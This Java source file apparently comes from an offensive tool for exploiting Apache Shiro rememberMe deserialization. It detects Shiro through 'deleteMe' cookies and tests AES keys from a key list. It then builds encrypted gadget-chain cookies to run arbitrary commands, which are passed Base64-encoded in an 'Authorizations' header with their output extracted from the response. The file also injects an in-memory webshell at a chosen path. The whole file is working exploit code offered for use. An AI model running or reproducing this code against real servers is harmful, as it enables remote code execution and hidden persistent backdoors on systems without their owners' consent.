package com.sma11new.exp.shiro;

import cn.hutool.core.codec.Base64;
import cn.hutool.core.io.resource.ResourceUtil;
import cn.hutool.core.util.StrUtil;
import com.mchange.v2.ser.SerializableUtils;
import com.sma11new.config.Config;
import com.sma11new.exp.shiro.attack.memShell.MemBytes;
import com.sma11new.exp.shiro.attack.payloads.ObjectPayload;
import com.sma11new.exp.shiro.attack.util.Gadgets;
import com.sma11new.exp.shiro.util.AesUtil;
import com.sma11new.exp.shiro.util.ShiroGCM;
import com.sma11new.utils.HttpMsgUtil;
import com.sma11new.utils.HttpUtils;
import com.sma11new.utils.Response;
import com.sma11new.utils.Tools;
import org.apache.shiro.subject.SimplePrincipalCollection;

import javax.xml.bind.DatatypeConverter;
import java.io.NotSerializableException;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ShiroAttack {
    private static HashMap<String, String> headers = new HashMap();
    private static int flagCount = 0;
    public static boolean AES_GCM_MODE = false;
    public static boolean complexReq = false;  // 复杂请求
    public static Map<String, Object> reqMsg = null;  // 处理后的复杂请求数据


    // 检测是否是shiro
    public static boolean checkIsShiro(String url, String cookieFlag) {
        headers.clear();
        Response response;
        if (!complexReq) {
            headers.put("Cookie", cookieFlag + "=1");
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap<String, String>) reqMsg.get("headers");
            String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
            headers.put("Cookie", getCookie(headers, cookieFlag, "1"));
            if (Objects.equals(reqMsg.get("method"), "POST"))
                response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
            else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        flagCount = countDeleteMe(response.getHead());
        return (flagCount >= 1);
    }

    // 检测key
    public static boolean checkKey(String url, String cookieFlag, String key) {
        headers.clear();
        String cookie = null;
        try {
            cookie = ShiroAttack.buildPayload(key);
        } catch (Exception e) {
            return false;
        }

        Response response;
        if (!complexReq) {
            headers.put("Cookie", cookieFlag + "=" + cookie);
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap<String, String>) reqMsg.get("headers");
            String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
            headers.put("Cookie", getCookie(headers, cookieFlag, cookie));
            if (Objects.equals(reqMsg.get("method"), "POST"))
                response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
            else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        return ((response.getHeadMap()!=null) && (countDeleteMe(response.getHead()) < flagCount));
    }

    // 检测利用链及回显
    public static boolean checkChain(String url, String cookieFlag, String key, String chain, String echo) {
        headers.clear();
        Response response;
        if (!complexReq) {
            headers.put("Cookie", GadgetPayload(chain, echo, key, cookieFlag));
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap<String, String>) reqMsg.get("headers");
            String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
            headers.put("Cookie", getCookie(headers, cookieFlag, GadgetPayload(chain, echo, key, cookieFlag)));
            if (Objects.equals(reqMsg.get("method"), "POST"))
                response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
            else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }
        return response.getHead().contains("Host");
    }

    // 执行命令
    public static String execCmd(String url, String cookieFlag, String key, String chain, String echo, String cmd) {
        headers.clear();
        Response response;
        if (!complexReq) {
            headers.put("Cookie", GadgetPayload(chain, echo, key, cookieFlag));
            headers.put("Authorizations", "Basic " + Base64.encode(cmd));
            response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap<String, String>) reqMsg.get("headers");
            String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
            headers.put("Cookie", getCookie(headers, cookieFlag, GadgetPayload(chain, echo, key, cookieFlag)));
            headers.put("Authorizations", "Basic " + Base64.encode(cmd));

            if (Objects.equals(reqMsg.get("method"), "POST"))
                response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
            else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }

        if (response.getCode() == 200 && response.getHead().contains("Host")) {
            String result = StrUtil.subBetween(response.getBody(), "BrY3jhHrh6", "yQqlMgS1cL");
            try {
                return Base64.decodeStr(result);
            } catch (Exception e) {
                return e.getMessage();
            }
        }
        return "执行失败";
    }

    // 注入内存马
    public static String injectMemShell(String url, String cookieFlag, String key, String chain, String memShell, String path, String pass) {
        String shellBody = null;
        try {
            shellBody = "user=" + MemBytes.getBytes(memShell);
        } catch (Exception e) {
            return "【-】 注入失败：" + e.getMessage();
        }

        headers.clear();
        Response response;

        if (!complexReq) {
            headers.put("Cookie", ShiroAttack.GadgetPayload(chain, "InjectMemTool", key, cookieFlag));
            headers.put("path", path);
            response = HttpUtils.post(url, shellBody, headers, Config.DEFAULT_ENCODING);
        } else {
            headers = (HashMap<String, String>) reqMsg.get("headers");
            headers.put("Cookie", getCookie(headers, cookieFlag, ShiroAttack.GadgetPayload(chain, "InjectMemTool", key, cookieFlag)));
            headers.put("path", path);
            Map<String, String> dataMap = (Map<String, String>) reqMsg.get("data");
            dataMap.put("user", MemBytes.getBytes(memShell));
            String data = HttpMsgUtil.mapToUrlEncodedString(dataMap);

            if (Objects.equals(reqMsg.get("method"), "POST"))
                response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
            else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
        }


        if (response.getCode() == 200 && response.getBody().contains("->|Success|<-")) {
            return Tools.extractBaseUrl(url) + path;
        } else {
            return "【-】 注入失败：" + response.getCode();
        }
    }

    public static String buildPayload (String key){
        Object principal = new SimplePrincipalCollection();
        byte[] serpayload = new byte[0];
        try {
            serpayload = SerializableUtils.toByteArray(principal);
        } catch (NotSerializableException e) {
            e.printStackTrace();
        }
        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
        String payload = null;
        try {
            payload = DatatypeConverter.printBase64Binary(AesUtil.encrypt(serpayload, bkey));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return payload;
    }

    public static String GadgetPayload (String gadgetOpt, String echoOpt, String spcShiroKey, String cookieName){
        String rememberMe = null;
        try {
            Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass(gadgetOpt);
            ObjectPayload<?> gadgetPayload = gadgetClazz.newInstance();
            Object template = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template);
            rememberMe = sendpayload(chainObject, cookieName, spcShiroKey);
        } catch (Exception var9) {
            var9.printStackTrace();
        }
        return rememberMe;
    }

    public static String sendpayload (Object chainObject, String shiroKeyWord, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
        byte[] encryptpayload = null;
        if (AES_GCM_MODE) {
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key,serpayload);
            return shiroKeyWord + "=" + byteSource;

        } else {
            encryptpayload = AesUtil.encrypt(serpayload, bkey);
            return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
        }
    }

    // 从文件读取所有key
    public static List<String> getAllKeys () {
        String[] keyInputs = new String[0];
        String keyFromFile = ResourceUtil.readUtf8Str("shiro_keys.txt");
        keyInputs = keyFromFile.split("\n");
        System.out.println(Arrays.asList(keyInputs));
        return Arrays.asList(keyInputs);
    }

    //计算包含几个deleteMe
    public static int countDeleteMe (String text){
        // 根据指定的字符构建正则
        Pattern pattern = Pattern.compile("deleteMe");
        // 构建字符串和正则的匹配
        Matcher matcher = pattern.matcher(text);
        int count = 0;
        // 循环依次往下匹配
        while (matcher.find()) { // 如果匹配,则数量+1
            count++;
        }
        return count;
    }

    // 处理cookie，配置是否保留原始Cookie值
    private static String getCookie(HashMap<String, String> headers, String cookieFlag, String attackCookie) {
        // 去除多余flag
        attackCookie = StrUtil.removeAll(attackCookie, cookieFlag + "=");
        // 没原始cookie，不存在保留原始内容，直接返回cookie payload
        if (headers.get("Cookie") == null)
            return cookieFlag + "=" +  attackCookie;
        // 有cookie，需要处理两种情况：
        //    1、原始cookie内容中包含rememberMe
        //    2、原始cookie内容中不包含rememberMe
        else {
            // 1、原始cookie内容中包含rememberMe
            if (headers.get("Cookie").contains(cookieFlag + "=")) {
                StringBuilder cookieRes = new StringBuilder();;
                List<String> cookieArray = new ArrayList<>(Arrays.asList(headers.get("Cookie").split(";")));
                // 原始cookie只有rememberMe一项，无需保留，直接返回cookie payload
                if (cookieArray.size() == 1)
                    return cookieFlag + "=" +  attackCookie;
                // 原始cookie除了rememberMe还有其他项，需要保留的是其它项
                else {
                    for (String cookie : cookieArray) {
                        if (!cookie.contains(cookieFlag + "="))
                            cookieRes.append(cookie).append("; ");
                    }
                    cookieRes.append(cookieFlag + "=" + attackCookie);
                    return cookieRes.toString();
                }
            }
            // 2、原始cookie内容中不包含rememberMe，直接拼接即可
            else return headers.get("Cookie") + "; " + cookieFlag + "=" +  attackCookie;
        }
    }
}
